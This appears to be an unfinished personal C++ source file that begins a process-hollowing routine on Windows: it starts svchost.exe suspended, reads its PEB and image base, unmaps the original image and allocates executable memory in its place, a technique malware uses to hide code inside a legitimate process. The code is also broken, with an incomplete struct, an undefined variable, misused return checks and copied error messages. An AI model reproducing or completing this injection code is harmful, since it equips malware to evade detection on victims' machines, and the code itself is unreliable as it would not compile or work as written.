#include <iostream>
#include "C:\Users\ruben.cherif\Documents\ntdll\x64dbg\ntdll.h"
#include <Winnt.h>
#include <Psapi.h>

#pragma comment (lib, "ntdll.h")

typedef struct procInfo {
	HANDLE hProcess;
	WORD 
};



std::string GetLastErrorAsString()
{
	//Get the error message ID, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0) {
		return std::string(); //No error message has been recorded
	}

	LPSTR messageBuffer = nullptr;

	//Ask Win32 to give us the string version of that message ID.
	//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

	//Copy the error message into a std::string.
	std::string message(messageBuffer, size);

	//Free the Win32's string's buffer.
	LocalFree(messageBuffer);

	return message;
}

int main()
{

	NTSTATUS status;

	LPSTR targetProcess = (LPSTR)"C:/Windows/System32/svchost.exe";
	char tgtProc[] = "C:/Windows/System32/svchost.exe";

	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();

	PULONG ReturnLength = 0;

	// Create suspended process
	status = CreateProcessA(
		NULL,
		targetProcess,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		si,
		pi);
	
	if (!status)
	{
		std::cout << "[x] Failed to execute " << targetProcess;
		std::cout << GetLastErrorAsString() << "\n";
		return FALSE;
	}

	std::cout << "Process" << targetProcess << "with PID " << pi->dwProcessId << "created.";

	// Get process PEB address
	status = NtQueryInformationProcess(
		pi->hProcess,
		ProcessBasicInformation,					// Retrieves a pointer to a PEB structure
		pbi,
		sizeof(PROCESS_BASIC_INFORMATION),
		ReturnLength);
	
	if (status != 0x0)
	{
		std::cout << GetLastErrorAsString() << "\n";
	}

	SIZE_T bytesRead = 0;
	
	//LPCVOID pebImageBaseOffeset = pbi->PebBaseAddress + 0x0008;
	LPVOID imageBaseAddr;

	PEB peb;

	// Read process PEB/ImageBase
	status = ReadProcessMemory(
	    pi->hProcess,							// Process Handle
	    pbi->PebBaseAddress,					// PEB Structure address
		&peb,
	    sizeof(PEB),
		&bytesRead);

	if (!status)
	{
		std::cout << "failed to read image base address" << std::endl;
		std::cout << GetLastErrorAsString() << "\n";
		return -1;
	}
	
	// Unamp executable section
	status = NtUnmapViewOfSection(
		pi->hProcess,
		peb.ImageBaseAddress
	);

	if (!status)
	{
		std::cout << "failed to read image base address" << std::endl;
		std::cout << GetLastErrorAsString() << "\n";
		return -1;
	}

	status = VirtualAllocEx(
		pi->hProcess,
		peb.ImageBaseAddress,
		pSourceHeaders->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (!status)
	{
		std::cout << "failed to read image base address" << std::endl;
		std::cout << GetLastErrorAsString() << "\n";
		return -1;
	}





}

